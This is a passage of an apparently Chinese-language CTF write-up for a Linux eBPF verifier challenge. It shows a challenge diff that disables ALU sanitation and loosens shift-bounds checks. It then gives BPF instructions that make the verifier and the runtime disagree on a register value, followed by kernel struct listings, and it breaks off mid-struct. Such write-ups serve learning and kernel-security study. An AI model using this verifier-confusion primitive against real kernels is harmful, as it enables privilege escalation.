    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>账号输入ctf即可登录，再<code>cd /</code></p>
<p>内核版本：6.12.47</p>
<p>禁掉<code>ALU Sanitation</code>，</p>
<p>在<code>adjust_scalar_min_max_vals</code>中：</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">	if (!is_safe_to_compute_dst_reg_range(insn, &amp;src_reg)) {
</span></span><span class="line"><span class="cl">		__mark_reg_unknown(env, dst_reg);
</span></span><span class="line"><span class="cl">		return 0;
</span></span><span class="line"><span class="cl">	}</span></span></code></pre></td></tr></table></div>
</div>
</div><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-diff"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="line"><span class="cl"><span class="gh">diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c
</span></span></span><span class="line"><span class="cl"><span class="gh">index 24ae8f33e5d7..e5641845ecc0 100644
</span></span></span><span class="line"><span class="cl"><span class="gd">--- a/kernel/bpf/verifier.c
</span></span></span><span class="line"><span class="cl"><span class="gi">+++ b/kernel/bpf/verifier.c
</span></span></span><span class="line"><span class="cl"><span class="gu">@@ -13030,7 +13030,7 @@ static int retrieve_ptr_limit(const struct bpf_reg_state *ptr_reg,
</span></span></span><span class="line"><span class="cl"> static bool can_skip_alu_sanitation(const struct bpf_verifier_env *env,
</span></span><span class="line"><span class="cl"> 				    const struct bpf_insn *insn)
</span></span><span class="line"><span class="cl"> {
</span></span><span class="line"><span class="cl"><span class="gd">-	return env-&gt;bypass_spec_v1 || BPF_SRC(insn-&gt;code) == BPF_K;
</span></span></span><span class="line"><span class="cl"><span class="gi">+	return true;
</span></span></span><span class="line"><span class="cl"> }
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> static int update_alu_sanitation_state(struct bpf_insn_aux_data *aux,
</span></span><span class="line"><span class="cl"><span class="gu">@@ -14108,7 +14108,7 @@ static bool is_safe_to_compute_dst_reg_range(struct bpf_insn *insn,
</span></span></span><span class="line"><span class="cl"> 	case BPF_LSH:
</span></span><span class="line"><span class="cl"> 	case BPF_RSH:
</span></span><span class="line"><span class="cl"> 	case BPF_ARSH:
</span></span><span class="line"><span class="cl"><span class="gd">-		return (src_is_const &amp;&amp; src_reg-&gt;umax_value &lt; insn_bitness);
</span></span></span><span class="line"><span class="cl"><span class="gi">+		return (src_reg-&gt;umax_value &lt; insn_bitness);
</span></span></span><span class="line"><span class="cl"> 	default:
</span></span><span class="line"><span class="cl"> 		return false;
</span></span><span class="line"><span class="cl"> 	}
</span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><p><strong>构造verifier和runtime不一致的寄存器</strong></p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_LDX_MEM</span><span class="p">(</span><span class="n">BPF_W</span><span class="p">,</span> <span class="n">BPF_REG_8</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_AND</span><span class="p">,</span> <span class="n">BPF_REG_8</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_ALU64_REG</span><span class="p">(</span><span class="n">BPF_ARSH</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="n">BPF_REG_8</span><span class="p">),</span> <span class="c1">// the bug verifier thinks REG_0 is 1 while is 0
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_9</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_ALU64_REG</span><span class="p">(</span><span class="n">BPF_SUB</span><span class="p">,</span> <span class="n">BPF_REG_9</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">),</span> <span class="c1">// verifier thinks REG_9 is 0 while is 1
</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>这里把一个<code>map</code>的值设置为1，然后<code>look_up_elem</code>。接下来，进入上面的代码。</p>
<p>把<code>runtime</code>为1的值读入reg8，<code>and</code>运算后<code>verifier</code>认为它是[0,1]</p>
<p>接着进行<code>1 arsh reg8</code>，由于<code>arsh</code>运算取的是<code>umin_val</code>，所以<code>verifier</code>认为它是1，实际上它是0</p>
<p>不管是对<code>ALU32</code>还是<code>ALU64</code>，进行<code>arsh</code>运算的时候，都是去<code>src_reg</code>的<code>umin</code>进行操作</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">scalar32_min_max_arsh</span><span class="p">(</span><span class="k">struct</span> <span class="n">bpf_reg_state</span> <span class="o">*</span><span class="n">dst_reg</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">				  <span class="k">struct</span> <span class="n">bpf_reg_state</span> <span class="o">*</span><span class="n">src_reg</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="n">u64</span> <span class="n">umin_val</span> <span class="o">=</span> <span class="n">src_reg</span><span class="o">-&gt;</span><span class="n">u32_min_value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/* Upon reaching here, src_known is true and
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * umax_val is equal to umin_val.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 */</span>
</span></span><span class="line"><span class="cl">	<span class="n">dst_reg</span><span class="o">-&gt;</span><span class="n">s32_min_value</span> <span class="o">=</span> <span class="p">(</span><span class="n">u32</span><span class="p">)(((</span><span class="n">s32</span><span class="p">)</span><span class="n">dst_reg</span><span class="o">-&gt;</span><span class="n">s32_min_value</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="n">umin_val</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">dst_reg</span><span class="o">-&gt;</span><span class="n">s32_max_value</span> <span class="o">=</span> <span class="p">(</span><span class="n">u32</span><span class="p">)(((</span><span class="n">s32</span><span class="p">)</span><span class="n">dst_reg</span><span class="o">-&gt;</span><span class="n">s32_max_value</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="n">umin_val</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">dst_reg</span><span class="o">-&gt;</span><span class="n">var_off</span> <span class="o">=</span> <span class="nf">tnum_arshift</span><span class="p">(</span><span class="nf">tnum_subreg</span><span class="p">(</span><span class="n">dst_reg</span><span class="o">-&gt;</span><span class="n">var_off</span><span class="p">),</span> <span class="n">umin_val</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/* blow away the dst_reg umin_value/umax_value and rely on
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * dst_reg var_off to refine the result.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 */</span>
</span></span><span class="line"><span class="cl">	<span class="n">dst_reg</span><span class="o">-&gt;</span><span class="n">u32_min_value</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">dst_reg</span><span class="o">-&gt;</span><span class="n">u32_max_value</span> <span class="o">=</span> <span class="n">U32_MAX</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">__mark_reg64_unbounded</span><span class="p">(</span><span class="n">dst_reg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">__update_reg32_bounds</span><span class="p">(</span><span class="n">dst_reg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">scalar_min_max_arsh</span><span class="p">(</span><span class="k">struct</span> <span class="n">bpf_reg_state</span> <span class="o">*</span><span class="n">dst_reg</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">				<span class="k">struct</span> <span class="n">bpf_reg_state</span> <span class="o">*</span><span class="n">src_reg</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="n">u64</span> <span class="n">umin_val</span> <span class="o">=</span> <span class="n">src_reg</span><span class="o">-&gt;</span><span class="n">umin_value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/* Upon reaching here, src_known is true and umax_val is equal
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * to umin_val.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 */</span>
</span></span><span class="line"><span class="cl">	<span class="n">dst_reg</span><span class="o">-&gt;</span><span class="n">smin_value</span> <span class="o">&gt;&gt;=</span> <span class="n">umin_val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">dst_reg</span><span class="o">-&gt;</span><span class="n">smax_value</span> <span class="o">&gt;&gt;=</span> <span class="n">umin_val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">dst_reg</span><span class="o">-&gt;</span><span class="n">var_off</span> <span class="o">=</span> <span class="nf">tnum_arshift</span><span class="p">(</span><span class="n">dst_reg</span><span class="o">-&gt;</span><span class="n">var_off</span><span class="p">,</span> <span class="n">umin_val</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/* blow away the dst_reg umin_value/umax_value and rely on
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * dst_reg var_off to refine the result.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 */</span>
</span></span><span class="line"><span class="cl">	<span class="n">dst_reg</span><span class="o">-&gt;</span><span class="n">umin_value</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">dst_reg</span><span class="o">-&gt;</span><span class="n">umax_value</span> <span class="o">=</span> <span class="n">U64_MAX</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/* Its not easy to operate on alu32 bounds here because it depends
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * on bits being shifted in from upper 32-bits. Take easy way out
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * and mark unbounded so we can recalculate later from tnum.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 */</span>
</span></span><span class="line"><span class="cl">	<span class="nf">__mark_reg32_unbounded</span><span class="p">(</span><span class="n">dst_reg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">__update_reg_bounds</span><span class="p">(</span><span class="n">dst_reg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><h5 class="heading-element" id="源码-1"><span>源码</span>
  <a href="#%e6%ba%90%e7%a0%81-1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h5><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">bpf_map</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">const</span> <span class="k">struct</span> <span class="n">bpf_map_ops</span> <span class="o">*</span><span class="n">ops</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">bpf_map</span> <span class="o">*</span><span class="n">inner_map_meta</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cp">#ifdef CONFIG_SECURITY
</span></span></span><span class="line"><span class="cl">	<span class="kt">void</span> <span class="o">*</span><span class="n">security</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cp">#endif
</span></span></span><span class="line"><span class="cl">	<span class="k">enum</span> <span class="n">bpf_map_type</span> <span class="n">map_type</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">u32</span> <span class="n">key_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">u32</span> <span class="n">value_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">u32</span> <span class="n">max_entries</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">u64</span> <span class="n">map_extra</span><span class="p">;</span> <span class="cm">/* any per-map-type extra fields */</span>
</span></span><span class="line"><span class="cl">	<span class="n">u32</span> <span class="n">map_flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">u32</span> <span class="n">id</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">btf_record</span> <span class="o">*</span><span class="n">record</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">numa_node</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">u32</span> <span class="n">btf_key_type_id</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">u32</span> <span class="n">btf_value_type_id</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">u32</span> <span class="n">btf_vmlinux_value_type_id</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">btf</span> <span class="o">*</span><span class="n">btf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cp">#ifdef CONFIG_MEMCG
</span></span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">obj_cgroup</span> <span class="o">*</span><span class="n">objcg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cp">#endif
</span></span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="n">BPF_OBJ_NAME_LEN</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">mutex</span> <span class="n">freeze_mutex</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">atomic64_t</span> <span class="n">refcnt</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">atomic64_t</span> <span class="n">usercnt</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="cm">/* rcu is used before freeing and work is only used during freeing */</span>
</span></span><span class="line"><span class="cl">	<span class="k">union</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">struct</span> <span class="n">work_struct</span> <span class="n">work</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k">struct</span> <span class="n">rcu_head</span> <span class="n">rcu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">};</span>
</span></span><span class="line"><span class="cl">	<span class="kt">atomic64_t</span> <span class="n">writecnt</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="cm">/* &#39;Ownership&#39; of program-containing map is claimed by the first program
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * that is going to use this map or by the first program which FD is
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * stored in the map to make sure that all callers and callees have the
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * same prog type, JITed flag and xdp_has_frags flag.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 */</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">const</span> <span class="k">struct</span> <span class="n">btf_type</span> <span class="o">*</span><span class="n">attach_func_proto</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="kt">spinlock_t</span> <span class="n">lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k">enum</span> <span class="n">bpf_prog_type</span> <span class="n">type</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="kt">bool</span> <span class="n">jited</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="kt">bool</span> <span class="n">xdp_has_frags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="n">owner</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">bool</span> <span class="n">bypass_spec_v1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">bool</span> <span class="n">frozen</span><span class="p">;</span> <span class="cm">/* write-once; write-protected by freeze_mutex */</span>
</span></span><span class="line"><span class="cl">	<span class="kt">bool</span> <span class="n">free_after_mult_rcu_gp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">bool</span> <span class="n">free_after_rcu_gp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">atomic64_t</span> <span class="n">sleepable_refcnt</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">s64</span> <span class="n">__percpu</span> <span class="o">*</span><span class="n">elem_count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">bpf_array</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">bpf_map</span> <span class="n">map</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">u32</span> <span class="n">elem_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">u32</span> <span class="n">index_mask</span><span class="p">;</span>
